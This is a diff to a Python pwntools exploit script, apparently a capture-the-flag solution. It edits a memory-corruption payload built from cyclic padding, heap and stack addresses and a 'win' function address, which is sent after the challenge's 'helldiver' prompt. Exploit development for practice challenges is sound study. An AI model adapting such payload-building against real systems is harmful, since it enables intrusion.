@@ -86,7 +86,8 @@ def exploit(p,e,r):
 
     # Return value for menu to main
     exp = cyclic(120) + p64(heap_addr) + p64(stack_addr+0x30) + ret_val
-    exp += cyclic(32) + p64(stack_addr+0x108) + p64(0x21) + win + b"B" * 184 + p64(0)  + p64(0x21) + win + cyclic(0x10) + p64(0x21)
+    exp += cyclic(32) + p64(stack_addr+0x108) + b"A" * 8 + win + b"B" * 184 + p64(0)  + p64(0x21) + win + cyclic(0x10) + p64(0x21)
+
     p.recvuntil(b"Waiting on your call, helldiver >>>")
     p.sendline(exp)   
 
